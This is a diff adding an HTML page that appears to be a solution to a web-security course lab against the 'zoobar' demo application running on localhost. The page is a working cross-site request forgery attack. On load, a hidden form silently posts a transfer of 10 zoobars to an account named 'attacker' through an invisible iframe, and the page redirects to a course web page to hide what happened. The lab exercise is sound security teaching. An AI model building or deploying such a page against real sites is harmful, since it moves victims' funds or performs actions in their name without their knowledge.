@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<body>
+    <form id="hideYoZoobars" action="http://localhost:8080/zoobar/index.cgi/transfer" method="POST"
+        target="attackFrame">
+        <input type="hidden" name="zoobars" value="10">
+        <input type="hidden" name="recipient" value="attacker">
+    </form>
+    <iframe style="visibility:hidden;" name="attackFrame"></iframe>
+    <script>
+        window.onload = function () {
+            window.location = "http://css.csail.mit.edu/6.858/2014/";
+            document.getElementById('hideYoZoobars').submit();
+        }
+    </script>
+</body>
+
+</html>
